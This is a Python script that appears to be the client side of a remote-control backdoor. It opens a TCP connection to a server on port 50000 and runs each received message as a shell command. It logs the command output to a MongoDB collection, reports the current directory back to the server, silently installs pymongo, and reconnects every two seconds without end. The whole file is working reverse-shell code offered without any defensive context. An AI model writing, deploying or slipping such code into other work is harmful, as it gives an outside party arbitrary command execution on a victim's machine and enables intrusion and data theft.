#!/usr/bin/env python3
import socket
import subprocess
import time
from os import chdir, getcwd
from importlib.util import find_spec
import signal
from sys import exit

# since pymongo is not installed by default, it's better to check for it first
if not find_spec('pymongo'):
    subprocess.Popen("pip3 install pymongo", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

if find_spec('pymongo'):
    import pymongo
else:
    exit(0)

errors_might_happen = (pymongo.errors.ServerSelectionTimeoutError, socket.error, Exception)
signal.signal(signal.SIGINT, signal.SIG_DFL)


class Client:
    def __init__(self, ip=socket.gethostname(), port=50000, db_link="mongodb://localhost:27017/"):
        self.ip, self.port = ip, port

        self.myclient = pymongo.MongoClient(db_link)
        self.mydb = self.myclient[db_name]
        self.mycol = self.mydb[collection_name]

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.start()

    def msg_to_send(self, msg_to_db):
        # the dict makes sure that db has msgs in certain format
        msg_to_db_ = {"data": "", 'sender': 'client'}.copy()
        msg_to_db_['data'] = msg_to_db
        msg_to_db_['pwd'] = getcwd()
        msg_to_db_['client'] = self.s.getsockname()
        return msg_to_db_

    def start(self):
        """Start the connection, the loop of receiving and returning cwd start."""
        try:
            self.s.connect((self.ip, self.port))
        except errors_might_happen:
            return

        self.s.settimeout(60)
        self.s.send(getcwd().encode())  # to let the server_ know the startup cwd.
        while True:  # to keep receiving
            try:
                msg_got = self.s.recv(1024).decode().strip()
                if msg_got == "CHECKING CONNECTION":  # This message only sent to check the connection
                    continue

                if msg_got.startswith("cd "):  # easier to chdir
                    try:
                        chdir(msg_got[3:])
                    except FileNotFoundError:
                        pass
                out, error = subprocess.Popen(msg_got, shell=True, stdout=subprocess.PIPE,
                                              stderr=subprocess.PIPE).communicate()
                out, error = out.decode().strip(), error.decode().strip()

                if out:
                    self.mycol.insert_one(self.msg_to_send(out))
                elif error:
                    self.mycol.insert_one(self.msg_to_send(error))

                self.s.send(getcwd().encode())  # last path after command, to keep server updated
            except errors_might_happen:
                break


db_name = 'my_ref_db'
collection_name = 'data_got'

while True:
    Client(port=50000)
    time.sleep(2)
